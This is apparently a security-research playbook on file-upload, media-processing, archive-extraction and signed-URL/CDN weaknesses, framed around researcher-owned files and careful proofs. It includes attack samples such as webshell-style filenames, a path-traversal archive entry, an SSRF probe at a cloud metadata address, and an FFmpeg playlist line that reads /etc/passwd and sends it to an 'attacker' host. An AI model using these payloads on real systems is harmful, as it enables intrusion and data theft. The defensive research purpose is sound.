# File / Media

> SCOPE: Load when upload, processing, preview, download, share, version, restore, or a media/CDN transformation path is the research surface, using researcher-controlled files only.

## Research families

**Authorization across representations**

- Authorization on every representation (original, preview, thumbnail, version, archive entry)
- Transformed and derived paths (resize, convert, transcode, extracted text) with weaker checks
- Preview versus download trust differentials (renderer versus attachment disposition)
- Alternate fetch paths (export, print, text-extract, virus-scan callback) bypassing checks
- Thumbnail-of-denied and OCR/text-extract paths returning derived content the byte path denies

**Validation and type confusion**

- MIME, extension, and parser discrepancies between validator and renderer
- Polyglot and multi-format files valid as one type to the validator and another to the renderer
- Content sniffing differentials (browser-inferred type disagreeing with the declared type or the validator)
- Web-server config upload into the served directory (`.htaccess`, `web.config`) that changes handler mappings
- Filename-parsing differentials (double extension, null byte, case, NTFS alternate data streams, 8.3 short names)
- Validator-versus-processor library divergence (one library validates the file, another parses it for preview/extraction/AV)
- Response-header override parameters (`response-content-type`, `response-content-disposition`) applied at serve time, after upload-time validation
- Container-within-container re-scan gaps (archive inside OOXML/PDF, media inside archive) where only the outer type is inspected
- Partial / chunked / multi-part / resumable upload reassembly (parts validated individually, the assembled object not)

**Archives and extraction**

- Archive extraction traversal, symlink, bomb-shaped, and nested-entry handling
- Extraction write-out outside the intended directory, including via link entries and pre-created parent directories

**Processors, renderers, and preview engines**

- Image/office/media processor exploitation (parser CVEs such as ImageMagick/ImageTragick, renderer code execution)
- Metadata and embedded-content processing (EXIF, document macros, media atoms, thumbnailer filename parsing)
- Preview renderer engine vulnerabilities (PDF.js and similar in-browser or embedded viewers)
- Auto-thumbnailer execution on untrusted files (desktop file managers, server-side thumbnail jobs)
- Resource-limit bypass (decompression bombs, image area/sequence limits, playlist-driven fetches)

**Signed URLs, CDN, and cache**

- Stale, revoked, expired, or permission-downgraded share and signed-URL persistence
- Signed-URL parameter tampering (overriding disposition, content-type, or object key in the signed query)
- Signing-key rotation and credential revoke propagation (S3/STS, Azure user delegation key, GCS key, CDN key pair)
- Cached or CDN-pinned artifacts surviving permission change or deletion, including transformation variants
- Media transformation surfaces (`/cdn-cgi/image/`, `?width=`, `/_next/image`, signed transform URLs) with params outside app authorization
- Transformation-parameter manipulation to reveal content a UI only blurs or crops
- Image-CDN source parameters (`url=`, `src=`, absolute `<SOURCE-IMAGE>`) as SSRF and internal-fetch carriers

**Lifecycle, storage, and sharing**

- Version, history, and restore lifecycle (old versions surviving revocation or delete)
- Content-addressed dedup reuse (identical bytes across tenants sharing one stored object and its ACL)
- Scan-then-serve race (the object mutated or swapped between the scan verdict and the serving request)
- Storage-location and permission mismatches (write-only upload dir served read-only, or served under a handler that executes)
- Virus-scan / content-disarm callback trust (a scan verdict or CDR output treated as an authorization or safety boundary)

## Preconditions

- Researcher-controlled test files only, clearly labeled and disposable, with benign content per probe.
- Full lifecycle mapped for the target feature: upload, process, store, preview, download, share, version, restore, delete.
- Two researcher sessions plus an anonymous session available for authorization differentials.
- Baseline of content-type, disposition, content-sniffing headers, and share-URL shape recorded before probing.
- Canonical XSS, SSTI, and XXE detail lives in web-browser/browser.md and parsers-injection/parsers.md and is referenced, not duplicated.
- Program scope and file-type rules confirmed before uploading active or parser-heavy formats.
- For signed-URL probes: the URL shape (query parameters, signer, expiry, and any credential binding) recorded before generation and re-checked after revoke/expire.
- For sniffing probes: the client/renderer version noted, since sniffing behaviour is per user agent and per `nosniff`.
- For archive probes: the extraction target mapped so a canary written outside it is detectable without touching shared paths.
- For config-upload probes: the served directory identified and the benign extension chosen so a handler-mapping change is observable without executing attacker code.
- For pipeline-divergence probes: the validator and the preview/extract/AV libraries fingerprinted as separate components before conclusion.
- For reassembly probes: a chunked/resumable upload endpoint whose finalization step (and each part) can be addressed independently.
- For dedup probes: evidence that storage is content-addressed (identical bytes reused) so a cross-tenant ACL question is testable.
- For processor probes: exact library and version captured (ImageMagick `magick -version` plus `magick identify -list policy`, Ghostscript `gs --version`, libvips `vips --version`, Pillow `PIL.__version__`, ExifTool `-ver`, ffmpeg `-version`) before any claim is attributed to a CVE.
- For ImageMagick probes: the active policy printed and stored as a baseline, because `policy.xml` (not the version) is what decides coder, delegate, filter, module, and path availability.
- For transform/CDN probes: the transformation endpoint, its cache TTL, its purge semantics, and whether the origin or the CDN answers recorded first.
- For preview-renderer probes: the viewer build identified (PDF.js version, `pdfjs-dist` in the bundle, desktop thumbnailer or server-side renderer) since the same PDF is safe in one and exploitable in the other.
- For resource-limit probes: the configured caps known where readable (ImageMagick resource policy, Pillow `MAX_IMAGE_PIXELS`, OCR/render timeouts) so a rejection is not mistaken for hardening.

## Oracles

- Representation bypass: second-session or anonymous fetch of a preview, thumbnail, version, text-extract, or archive-entry URL returns researcher file bytes denied on the primary path.
- Stale-link survival: revoked, expired, downgraded, logged-out, or deleted researcher share still returns file bytes from a clean session.
- Disposition flip: the same object served inline in one representation (rendered) and as attachment in another, with the inline variant executing or rendering researcher markup.
- Type-confusion service: file validated as one type but served with a conflicting content-type or sniffable body that the browser renders.
- Header-override oracle: appending `?response-content-type=text/html` to a public object URL changes the served type. Two distinct signals: the object is served as HTML (override honored anonymously), or the error is `Request specific response headers cannot be used for anonymous GET requests` (S3-style: override exists but needs a signed request — re-sign with a researcher identity and retry).
- Extraction write-out: archive entry with traversal or link-shaped name materializes outside the expected researcher directory or listing on read-back.
- Metadata reflection: benign canary from EXIF, comment, or document property appears in preview HTML, listing API, or error text served to the second session.
- Version resurrection: post-delete or post-revocation version-ID or history fetch still returns prior researcher bytes.
- Cache persistence: post-delete anonymous fetch still returns researcher bytes with a cache-hit signal that later converges to a miss after expiry.
- Variant persistence: after deleting or revoking the original, a transformation URL (`/cdn-cgi/image/<opts>/<src>`, `?width=`, or a cached IO variant) still returns derived pixels.
- Byte-identity oracle: the hash of bytes returned on a denied path equals the hash of the uploaded researcher file (status alone is never the proof).
- Sniff-differential oracle: the served bytes begin with a signature (e.g. `<!DOCTYPE HTML`, `%PDF-`) that the declared `Content-Type` contradicts and the client honors. Requires the declared type to be absent/unknown or itself scriptable — see False positives.
- Signed-URL tampering oracle: editing a signed query parameter still returns bytes, proving the parameter is unsigned or the semantics are client-trusted.
- Transform-parameter oracle: removing or zeroing a cosmetic parameter (`blur`, `trim`, `quality`) on a transformation URL returns unredacted content that the application only ever linked in blurred form.
- Transform-source oracle: an absolute URL in the transformation source position (`/cdn-cgi/image/<opts>/http://169.254.169.254/...`, `?url=`, `?src=`) is fetched server-side, returning internal content, timing, or an error body naming the internal host.
- Transform-metadata oracle: a metadata/format endpoint (`format=json`, `metadata=keep`) returns the source MIME type, dimensions, or GPS of a file the caller cannot otherwise read.
- Handler-mapping oracle: a benign file of an unlisted extension placed in the served directory executes or is served as code after a config file is uploaded.
- Pipeline-divergence oracle: the validator accepts an object that the preview/extract/AV stage parses as a different type (or vice versa) on the same request.
- Scan-verdict bypass: an object marked "clean" by the AV/CDR stage still carries an active payload the renderer honors.
- Text-extract leak: an extracted-text / OCR endpoint returns content derived from a file the byte-serving path denies to the same session.
- Thumbnail-of-denied: a generated thumbnail URL for a denied original returns pixel data derived from it, reproducing the canary.
- Reassembly bypass: a chunk/part accepted individually produces an assembled object that the single-shot path would reject.
- Dedup cross-tenant: uploading bytes that match another tenant's stored object returns a reference readable across tenants.
- Quote-boundary oracle (transform/signed URLs): change one parameter and observe 403 (parameter is signed) versus 200 (parameter is unsigned) — this maps the signature's scope one parameter at a time.
- Key-rotation oracle: an old signed URL still works after the signing key, key pair, or user delegation key is rotated/revoked.

## Minimal safe proof

1. Baseline: upload one benign file per type under test; record status, stored URL, preview URL, headers, body hash, and share-URL shape per session.
2. Representation sweep: request original, preview, thumbnail, text-extract, version, and export variants from owner, second-account, logged-out, and anonymous sessions; diff status and hashes.
3. Lifecycle check: downgrade permission, expire, revoke, then delete the researcher object in order, re-requesting every known URL after each transition from a clean session.
4. Single-variable type probe: change one signal at a time (extension, content-type header, magic bytes) with inert content and observe validator-versus-renderer disagreement only.
5. Archive probe: upload a minimal researcher archive with one traversal-named and one link-shaped entry containing canary text; verify listing and extraction read-back without touching shared paths.
6. Signed-URL probe: generate a share for a researcher object, revoke/expire it, then replay the URL (and a tampered-parameter variant) from a clean session.
7. Header-override probe: fetch a researcher object with and without `?response-content-type=text/html`; if the object is served inline under the target origin, record the response type; if it errors, note whether the error says the override needs a signed request, and test the same override on a share URL the app itself generated.
8. Transform probe: fetch the same researcher object through every transformation path found (CDN prefix, query params, derived-variant URL) and diff bytes, headers, and cache status; then repeat after deletion and after dropping any redaction-ish parameter.
9. Stop conditions: any non-researcher file access, stored script executing outside the researcher session, scanner or renderer slowdown, or third-party cache pollution — halt, delete researcher files, and report the oracle.

## False positives

- Second-session 200 returning a login page, placeholder, or error body with matching bytes — require researcher file bytes or canary, not status alone.
- Inline disposition on a correctly authorized owner-only URL — disposition alone is not bypass; require cross-session or anonymous readability plus a renderer sink.
- Validator rejecting the file with a clear error — rejection is the control passing; require validator-renderer disagreement on the same object.
- Archive listing that echoes entry names without extraction — name reflection is not path traversal; require write-out or read-back outside the expected path.
- Metadata canary visible only to the owner session — owner-visible reflection is not leakage; require second-session or anonymous visibility.
- Version URL returning 404 after delete while search or listing still names the file — stale index text without retrievable bytes is cleanup lag, not resurrection.
- Cache hit on a public-by-design asset with no permission change — require a revoked or deleted researcher object still served as HIT.
- Antivirus or processing delay mistaken for parser execution — slow responses without renderer or extractor oracle are pipeline latency, not impact.
- Sniff/hash difference alone with no cross-session read — a differing `Content-Type` is hardening context unless it turns a denied byte stream into a served one.
- `nosniff` present with a non-HTML declared type: browsers use the declared type as-is for navigations, so `image/png` + `nosniff` will not render HTML. The exploit needs an absent/unknown declared type, a scriptable declared type, or a downloaded file the victim later opens locally — check the header before claiming sniffing.
- `response-content-type` override that only works when *your own* identity signs the request: on S3 the object must already be publicly readable for the override trick, and the served override lives under the storage domain unless a CDN rewrites to the app origin. Confirm the object is same-origin/public before calling it stored XSS.
- MinIO-style `response-*` override params are documented behavior, not a defect by themselves; the finding is the served scriptable type under a trusted origin.
- `download` attribute "forced download" claims: the attribute is honored only for same-origin or `blob:`/`data:` URLs, so cross-origin `download`-based controls are client-side wishful thinking.
- Signed URL valid from a different IP or after short delay but before its stated expiry — presigned URLs are bearer tokens by design; require reuse after expiry or after the underlying credential is revoked.
- A presigned URL that still works after the *user session* ends but before the key/signature expires — bearer semantics again; check the credential type (long-lived IAM key versus STS session) before scoping impact.
- Filename with `../` accepted at upload but stored under a generated name — the traversal only matters if it survives to extraction or to the filesystem path.
- Custom handler executing a file the *owner* alone can request — self-execution on your own upload is not a cross-principal finding unless it reaches another session's data or a shared resource.
- Text-extract 200 returning boilerplate OCR (or an empty string) rather than the denied file's content — require the source canary in the extracted text.
- Thumbnail returning a generic placeholder or default image — require pixels derived from the denied researcher object.
- Client-side blur, crop, or overlay in the UI is presentation only; require the transformation endpoint itself to return the unredacted pixels, and check that the "unblur" is not just the original public URL.
- Shared CDN variant caches and removed `Vary` headers are documented optimization behavior; the finding is private content reachable after revocation, not the variant itself.
- Image-resize 200 that echoes the source URL or a generic error — require internal content, a timing differential, or a body naming the internal host for an SSRF claim.
- Processor CVE claims without a version match: the same file that crashes one ImageMagick/Ghostscript/libvips build is inert on another; a crash alone is also not code execution.

## Version/implementation notes

### Upload validation — content-type, extension, signature, filename

- **Windows NTFS Alternate Data Streams**: `shell.asp:.jpg` / `shell.php::$DATA` — the colon is a stream separator and the on-disk file keeps the pre-colon extension; OWASP's rule is to reject any filename containing a colon (`:`). [T1 OWASP]
- **8.3 short names**: NTFS auto-generates aliases (`web.config` → `WEB~1.CON`); an overwrite/collision check that only validates the long name can be bypassed by referencing the predictable short alias. Disable with `fsutil behavior set disable8dot3 1`, or (better) generate the stored name server-side. [T1 OWASP]
- **Extension bypasses** to test after decoding the filename: double extension (`.jpg.php` slips past `\.jpg`), null byte (`.php%00.jpg` truncates to `.php`), case (`.pHp`), and interpreter-equivalent alternates (`.phtml`, `.php5`, `.pht`; `.jsp`/`.jspx`; `.asp`/`.aspx`). [T1 OWASP]
- **Config-file upload**: `.htaccess` / `web.config` inside the served directory can remap a harmless extension to an executable handler; the defense is storing outside the webroot and disabling per-directory overrides (Apache `AllowOverride None`, locked IIS handler mappings). [T1 OWASP]
- The `Content-Type` supplied by an upload is user-controlled and spoofable; file-signature (magic-byte) validation should not be used alone. The safest stored filename is a server-generated random string (e.g. UUID). [T1 OWASP]
- **File-signature validation matrix** to reproduce validator/renderer disagreement: image signatures (`GIF87a`/`GIF89a`, `\x89PNG`, `FF D8 FF`, `RIFF....WEBP`, `BM`, `\x00\x00\x01\x00` icon), archive signatures (`\x1f\x8b\x08`, `PK\x03\x04`, `Rar!`), and font signatures (`wOFF`, `wOF2`, `OTTO`, `ttcf`). A polyglot that satisfies one signature class while a renderer honors another (e.g. an image that is also HTML) is the productive case. [T0 WHATWG]
- **Object-store response override**: MinIO honors `response-expires`, `response-content-type`, `response-cache-control`, `response-content-encoding`, `response-content-language`, and `response-content-disposition` on GET/HEAD, applied *after* the stored headers in a plain overwrite with no validation and no auth check in the override function — so `?response-content-type=text/html` flips a stored `image/png` to HTML on a public object. S3 implements the same parameters but refuses anonymous use with `Request specific response headers cannot be used for anonymous GET requests`; a presigned GET signed by any valid identity (boto3 `ResponseContentType`) can bake the override into the signature and produce the same flip. This is a serve-time bypass of every upload-time type decision; impact is real only when the bytes are served under an origin you care about. [T2 voorivex]
- **Chunked/reassembly**: hash the *assembled* object, not the parts. Validate the finalize step with the object's own type signals; a per-part check that accepts JPEG parts will happily assemble a ZIP. Resumable-upload **session URIs** are themselves bearer tokens — anyone holding one can upload, and their lifetime is independent of the signed URL that started the upload. [T1 GCS]
- **Nested containers**: AV/CDR and type checks usually inspect the outer container. A ZIP inside OOXML, an archive inside a PDF attachment, or a second-stage archive inside a media container is a re-scan gap; test it as a probe, not as a claimed vulnerability.

Upload pipeline stages to fingerprint (validator and renderer are frequently different libraries):

```text
extension check → content-type check → magic-byte check
   → AV/CDR stage → parser for preview/extract/transcode → storage
   → serving handler (Content-Type + Content-Disposition [+ nosniff])
   → CDN transformation / cache key → variant cache / edge
```

### Content-Disposition, Content-Type, and sniffing

- `Content-Disposition` types: `inline` = default processing (rendered); `attachment` = save locally; **unknown/unhandled types are to be treated like `attachment`**. The `filename`/`filename*` parameters (the latter per RFC 5987) are **advisory**: recipients MUST strip path segments and MUST ensure a safe extension, and SHOULD strip control characters, leading/trailing whitespace, and shell-meaningful names (`.`,`..`,`~`,`|`, device names). A downstream component that trusts the server filename verbatim is the seam. [T0 RFC 6266]
- **MIME sniffing (WHATWG)**: file extensions are *not* used to determine the supplied type over HTTP; if the declared type is missing/`unknown`, browsers read up to **1445 bytes** and match byte patterns — including `<!DOCTYPE HTML`, `<HTML`, `<SCRIPT`, `<TABLE` (→ `text/html`) and `%PDF-` (→ `application/pdf`). The `no-sniff` flag (`X-Content-Type-Options: nosniff`) makes the computed type the supplied type. "Scriptable" MIME types are **XML, HTML, and `application/pdf`**. [T0 WHATWG]
- **`nosniff` has two effects**: (1) for destinations `script`/`style`, the browser *blocks* the response when the MIME type is not a JS type / `text/css`; (2) for everything else, including top-level navigations, it disables sniffing and uses the declared `Content-Type` as-is — explicitly preventing a response from being treated as `text/html` when the declared type is absent or non-HTML. So `nosniff` + `text/plain` is a real control for navigation, and the exploitable combos are missing/unknown declared types, declared scriptable types, or download-then-open flows the browser cannot police. [T1 MDN]
- **`download` attribute scope**: honored only for same-origin URLs, or the `blob:` and `data:` schemes. `/` and `\` in the attribute's filename are converted to `_`. [T1 MDN]
- Rails sets `X-Content-Type-Options: nosniff`, `X-Frame-Options: SAMEORIGIN`, and `Referrer-Policy: strict-origin-when-cross-origin` by default; a deployment that clears or overrides these reopens sniffing and framing. [T1 Rails]

Sniffing decision points to reproduce (declared type vs bytes vs `nosniff`):

| Declared `Content-Type` | First bytes | `nosniff` | Computed type |
|---|---|---|---|
| `image/png` (claim) | `<!DOCTYPE HTML` | unset | `text/html` (rendered) |
| `image/png` (claim) | `<!DOCTYPE HTML` | set | `image/png` (navigation blocked as image, not HTML) |
| `text/plain` | `%PDF-` | unset | supplied `text/plain` unless unknown |
| any | signature class match | set | supplied type (no sniff) |

### Archive extraction — traversal, links, bombs, nesting

- **Zip Slip** (Snyk, disclosed 2018-06-05) is directory traversal via archive entry names (`../../evil.sh`) across **tar, jar, war, cpio, apk, rar, 7z**; it is most prevalent in **Java** because no central high-level archive library exists, so hand-copied `new File(dest, entry.getName())` snippets proliferate. It also appeared in JavaScript, Ruby, .NET, and Go ecosystems. Reference CVEs: **CVE-2018-1002203** (unzipper `0.8.13` fix) and **CVE-2018-1002207** (mholt/archiver); adm-zip was confirmed affected Apr 2018. Validating only after concatenation is the bug; canonicalize/validate the resolved path first. [T2 Snyk]
- **Python `tarfile` extraction filters** (added **3.12**, PEP 706) mitigate this at the library level: `filter='fully_trusted'` (honor everything), `filter='tar'` (strip leading slashes, refuse absolute paths and outside-destination paths, clear setuid/setgid/sticky and group/other write bits), `filter='data'` (also refuse absolute/outside hard **and** soft links and device files/pipes, drop owner/group and exec bits). Since **Python 3.14** the default filter is **`data`**; before that it was effectively `fully_trusted` (the docs call out 3.13 and lower as having a less secure default). Detect support with `hasattr(tarfile, 'data_filter')`. [T1 Python]
- **Link emulation refusal (3.14)**: `tarfile.LinkFallbackError` is raised to refuse emulating a hard or symbolic link by extracting another archive member when that replacement member would itself be rejected by the filter — a second-order bypass of link checks. [T1 Python]
- **No filter blocks all dangerous features**: the pre-defined filters do not stop denial-of-service (decompression bombs) or live-data races. Recommended extras: extract into a fresh `mkdtemp`, disallow symlinks if unused, use OS-level disk/memory/CPU limits, allow-list filename characters, check extensions, and cap file count/total size/name length. On case-insensitive filesystems also check for shadowing. [T1 Python]
- **CPython `zipfile` sanitizes by construction**: `_extract_member` re-roots the member name (drive/UNC/leading separators dropped), splits on the platform separator, and drops `''`, `.`, and `..` components; a member whose traversal cannot be normalized is skipped when `_ignore_invalid_names` is set. This is why `zipfile.extract*` is not zip-slip-prone by default — treat a custom or third-party extractor as the suspect, not the stdlib. [T1 CPython]
- **Symlink-shaped entries** are only metadata until the extractor writes them: a two-step sequence (write a link pointing outside, then write through it) defeats name-only checks. Defenses: refuse symlink/hardlink entries unless needed, resolve and compare the canonical target against the destination before any write, and never extract over an existing path. [T1 Python] [T2 Snyk]
- **Nested archives** defeat single-pass scanners: a traversal-named entry inside a second-stage archive is not seen until the inner archive is itself extracted; scanners that only hash or inspect the outer container pass it. Probe with the traversal name in the *inner* archive.
- Java upload limits should be computed **after decompression** using a secure zip-size method, not from the compressed `Content-Length` (SEI CERT IDS04-J, "Safely extract files from ZipInputStream"). [T1 OWASP]

Filter → what it refuses (Python `tarfile`):

| Filter | Absolute paths | `..` out of destination | Links outside dest | Device/pipe files | Metadata |
|---|---|---|---|---|---|
| `fully_trusted` | allowed | allowed | allowed | allowed | honored |
| `tar` | refused | refused | refused | allowed | setuid/gid/sticky + group/other write cleared |
| `data` (default ≥3.14) | refused | refused | refused | refused | owner/group + exec bits dropped |

### Image and media processors

- **ImageMagick's model is "everything allowed unless denied", and the last matching policy wins**; broad denies must come before specific allows. What is actually available is decided by `policy.xml`, not by the release notes: resource caps (`time`, `memory`, `map`, `disk`, `area`, `width`, `height`, `list-length`, `throttle`), `delegate rights="none" pattern="*"`, `filter rights="none"`, path denies (`-`, `[Ff][Dd]:*`, `/etc/*`, `*../*`, `@*` for indirect reads), a `module` allowlist (`{GIF,JPEG,PNG,WEBP}`), `coder` rights for write-only formats, `system` knobs (`shred`, `max-memory-request`, symlink follow refusal), and `svg` `substitute-entities` denial. Fingerprint with `magick identify -list policy`. [T1 ImageMagick]
- Since **7.1.1-16** upstream ships selectable policies (`open`, `limited`, `secure`, `websafe`) chosen at configure time with `--with-security-policy=...`; the upstream default is `open`, while distro packages commonly tighten it. Policy glob patterns were **case-sensitive before 7.1.1-16**, so `{GIF,...}` (or `[Pp][Nn][Gg]`) is required for reliable matching. `configure --with-frozenpaths=yes` makes delegates use absolute paths (`/usr/bin/gs`) instead of resolving through `PATH`, and `delegates.xml` should be reviewed for anything left enabled. Doyensec maintains a policy evaluator for auditing a given `policy.xml`. [T1 ImageMagick]
- **Ghostscript pipe devices**: **CVE-2023-36664** is mishandled permission validation for pipe devices — the `%pipe%` prefix or the `|` character as a filename prefix — reachable when a delegate (e.g. an ImageMagick PS/PDF path) invokes Ghostscript on attacker PostScript; CWE-78, CVSS 8.4 (Red Hat) / 7.8 (NVD). RHEL 7/8 were reported **not affected** because their Ghostscript forbids file execution with `.invalidfileaccess` under `-dSAFER`, while RHEL 9 shipped a fix in Oct 2023 (RHSA-2023:5459) — a textbook case of backport divergence deciding exploitability. Upstream fixes landed in the Ghostscript **10.01.2** line (advisory-reported; confirm against the Artifex release notes for a given build). [T1 Red Hat]
- **ImageMagick × Ghostscript** remains the classic chain: the parser is a delegate invoker, and the policy domains that stop it are `delegate`, `filter`, and `path`, not a version check. Test whether the deployment actually applies `-dSAFER` and whether `delegates.xml` was frozen. [T1 ImageMagick] [T2 ImageTragick]
- **libvips / sharp**: sharp `< 0.35.0` inherited four libvips CVEs (**CVE-2026-33327**, **CVE-2026-33328**, **CVE-2026-35590**, **CVE-2026-35591**; two High) fixed by upgrading to sharp 0.35.0+ / libvips 8.18.3; the documented workaround is `sharp.block({ operation: ["VipsForeignLoadNsgif", "VipsForeignLoadTiff", "VipsForeignLoadVips"] })`. Prebuilt sharp binaries and a globally installed libvips can be different versions in the same app — fingerprint both. [T1 GHSA]
- **libvips direct**: **CVE-2025-29769** is a heap buffer overflow (crash) reachable from crafted image input; `pdfload` has had separate malformed-PDF buffer over-reads. [T1 NVD]
- **Pillow decompression-bomb guard**: `DecompressionBombWarning` above `MAX_IMAGE_PIXELS`, `DecompressionBombError` above **twice** that limit; the default is `int(1024 * 1024 * 1024 // 4 // 3)` (≈ 89.5 Mpx, sized as a quarter gigabyte of 24-bit pixels) and it can be raised, disabled (`Image.MAX_IMAGE_PIXELS = None`), or escalated (`warnings.simplefilter('error', ...)`). A successful bomb therefore tells you the guard was raised/disabled — an oracle for the deployment's limit. [T1 Pillow]
- **FFmpeg playlists are a fetch surface**: an HLS `.m3u8` whose segment `url:` uses the `concat` protocol can mix remote and `file://` URLs (`concat:http://attacker/header.m3u8|file:///etc/passwd`), letting a converted or thumbnailed video read local files and exfiltrate them in a follow-up request; the classic disclosure also notes the trigger fires when a file manager generates a thumbnail. Affects ffmpeg/libav (CVE-2016-1897/1898); mitigations are `--disable-network` builds and isolation. [T2 oss-sec]
- **ExifTool is a code-execution surface for metadata**: **CVE-2021-22204** — improper neutralization in the **DjVu** module, ExifTool **7.44 through 12.23**, arbitrary code execution when parsing a malicious image, triggerable from a wide variety of valid container formats; fixed in **12.24** and a metadata pass often runs before any type the app cares about. [T1 oss-sec]
- **Media CDN transform endpoints**: Cloudflare's URL interface is `/cdn-cgi/image/<OPTIONS>/<SOURCE-IMAGE>`, where `<SOURCE-IMAGE>` may be an **absolute `http(s)://` URL** (remote fetch) and `<OPTIONS>` is a comma-separated parameter list. `blur` is explicitly documented as unsuitable for obscuring content "as the URL can be modified to remove the blur parameter"; `format=json` returns source MIME/size; `metadata=none|keep|copyright` controls EXIF/GPS retention; `onerror=redirect` falls back to the original source. Treat any transformation parameter as an authorization-adjacent decision. [T1 Cloudflare]
- Fastly IO fetches the original with **no query parameters** (`image.png`) and caches each transformation as a variant of it; for services created on or after 2023-05-02 a **minimum cache TTL of 60 s** applies to transformed images, and IO **removes the origin `Vary` header** at shield POPs so variants do not fragment the cache. [T1 Fastly]

### Preview renderers and thumbnailers

- **PDF.js CVE-2024-4367**: missing type validation of the font `FontMatrix` array, which is interpolated into a `new Function(...)` body used to pre-compile glyph paths; a PDF can supply a string element in `/FontMatrix` and execute JavaScript when the page renders. Requires `isEvalSupported` (default true). Affects Firefox < 126 and ESR < 115.11 and `pdfjs-dist`-based embedders (~2.7 M weekly downloads at disclosure); fixed in PDF.js **4.2.67** (2024-04-29). Mitigations: `isEvalSupported = false`, or a CSP without `eval`/`Function`. Headless server-side use "seem not to be affected" per the researchers, but updating is advised. Recursively check `node_modules` for bundled `pdf.js`. [T2 Codean]
- **Thumbnailers execute on untrusted files by design**: **CVE-2017-11421** in gnome-exe-thumbnailer (< 0.9.5) — VBScript injection when generating thumbnails for MSI files, triggered by a filename containing VBScript, i.e. a local attack when the victim browses a directory in GNOME Files. The pattern generalizes: filename-derived command construction inside preview/thumbnail tooling, with no user action beyond opening a folder. Probe by filename shape and side effects, never by executing attacker code. [T2 oss-sec]
- Office/document preview: OWASP recommends **Apache POI** for Microsoft documents and **CDR** for PDF/DOCX-class files, so the type check, the CDR pass, and the preview renderer are three components that can disagree; external relationships and embedded objects are separate parse paths from the outer type check. [T1 OWASP]

### Signed URLs, CDN authorization, and transform scope

- **AWS S3 presigned URLs** carry the credentials of the IAM principal who generated them and are **bearer tokens**. Validity ends at the earlier of the configured expiration or the moment the underlying credential is **revoked, deleted, or deactivated** — so a URL created with temporary credentials (STS/role/EC2 instance profile) dies with the session regardless of a longer expiry. [T1 AWS]
- S3 expiry ranges: console 1 minute–12 hours; CLI/SDK up to **7 days** with long-lived SigV4 IAM user credentials. Policy condition keys can narrow it further — `s3:signatureAge` (reject signatures older than N ms) and network pins via `aws:SourceIp` / `aws:SourceVpce`. Failure modes worth distinguishing: `SignatureDoesNotMatch` (clock drift, proxy rewriting headers/query, mismatch between generation and use), `ExpiredToken` (underlying creds dead), and `AccessDenied ... HeadersNotSigned: if-range` (Range signed but `If-Range` not). None of these is an authorization bypass by itself. [T1 AWS]
- **MinIO/S3 response overrides** are the serve-time seam described above: the override parameter is part of what makes the stored type irrelevant, and on S3 the override only works when the request is signed. When you hold a *share* URL the app generated, test whether *its* signature already covers `response-content-type` — if the app signs a URL template that includes caller-influenced parameters, the override can ride along. [T2 voorivex]
- **CloudFront signed URLs**: canned policy = expiry only, no start time, no IP pin, no wildcard, shorter URL; custom policy = optional start time, IP range, wildcard path, and a base64 policy in the URL. CloudFront accepts RSA-2048 and ECDSA-256 key groups; it checks expiry **at request time** (an in-flight download completes, but any Range GET after expiry fails), and **adding a query string after signing returns 403**, so query parameters are inside the signature. [T1 AWS]
- **Google Cloud Storage V4 signed URLs**: `X-Goog-Expires` is measured in seconds from `X-Goog-Date` and the longest value is **604800 s (7 days)**; access lasts until expiry **or key rotation**; `X-Goog-SignedHeaders` lists the headers that must be sent (with `host` required); signed URLs only work through XML API endpoints; and a resumable upload's **session URI** is itself a bearer token — anyone holding it can upload. The canonical request binds verb, path, canonical query string, canonical headers, signed headers, and payload. [T1 GCS]
- **Azure SAS**: a SAS is a bearer token appended to the resource URI, authorized purely by its signature; Azure does **not** track or audit token generation. Three types: **user delegation** (Entra credentials; recommended), **service** (account key, one service), and **account** (account key, multiple services plus service-level operations). The **user delegation key can be valid up to seven days**, and the signed key expiry may be at most seven days from the SAS start. Revocation paths differ: revoke the **user delegation key**, or change/remove RBAC role assignments and POSIX ACLs for the principal; **stored access policies can be revoked only for service SAS** (user delegation and account SAS must be ad hoc). Resource scope (`sr=b` blob, `sr=c` container) decides blast radius. [T1 MS Learn]
- **Cloudflare Images signed URLs**: set `requiredSignedURLs`, then append `exp=<unix seconds>` and `sig=<hex HMAC-SHA256>` where the string signed is the **path plus `?` plus the sorted query string** (e.g. `/<account_hash>/<image_id>/<variant>?exp=1631289275`) using the key from the Images dashboard; private images do not support custom paths. [T1 Cloudflare]
- **imgix**: signing is an **MD5** over the token plus the path and parameters, appended as `s` (must be last); changing the path or any parameter after signing returns **403**, and the docs note you must re-sign if you change parameters yourself. `expires` is a separate parameter (so it is only enforced when it is included in the signed URL); after expiry the request returns **404** and, before expiry, `Cache-Control` is rewritten to the seconds remaining. Rotating an exposed token means creating an identical source and cutting over. [T1 imgix]
- **imgproxy**: URL signing is **disabled by default** and recommended for production; `IMGPROXY_KEY`/`IMGPROXY_SALT` are hex, and the signature is URL-safe base64 HMAC-SHA256 of the **salt prepended to the unsigned path** (`/rs:fill:.../<encoded-source>.<ext>`). Source restriction is `IMGPROXY_ALLOWED_SOURCES`, a comma-separated prefix allowlist (blank = any URL), with wildcards matching everything except `/`. [T1 imgproxy]
- **Cloudflare Image Resizing caching**: optimized images follow the original's cache rules with a **minimum cache time of one hour**; `/cdn-cgi/` URLs **cannot be purged individually**, but purging the original URL purges all optimized versions — which is exactly the stale-variant surface to test after delete/revoke. Custom cache keys on the origin image can prevent the original from being cached at all. [T1 Cloudflare]
- Signed-URL semantics (overridable `response-content-disposition`/`response-content-type`, path/scope, clock-skew tolerance, and revocation propagation) differ per provider; always re-test from a clean session after each lifecycle event, and test whether an *unsigned* parameter in the query changes the response.

Signature-scope test plan (one variable per request):

```text
1. drop the signature          → must fail (negative control)
2. change one signed param     → 403 means covered, 200 means unsigned
3. add a new query param       → CloudFront 403 / Fastly+imgix 403 / imgproxy ignores
4. response-content-type/-disposition → is the override inside the signature?
5. change path case / add ../  → check normalization before signature check
6. replay after key rotation / credential revoke
7. replay at the expiry boundary (and after) from a clean session
8. swap method (GET signature on HEAD) and add Range
9. replace the object at the same key, reuse the old URL
10. fetch a cached variant after delete/revoke
```

### Storage, serving, and pipeline hardening

- Storage priority (OWASP): (1) store on a **different host** from the app; (2) store **outside the webroot**; (3) store **inside the webroot write-only** — and if read access is needed, add internal-IP/authorized-user controls. Storing in a database adds SQLi and backup/performance risk and is advised only with a DBA. [T1 OWASP]
- Serving should be mediated by an application handler mapping an opaque id to a file, not by directory listing; uploads must not land in a directory the web server executes (e.g. Apache `DocumentRoot` pointing at the upload folder). [T1 OWASP]
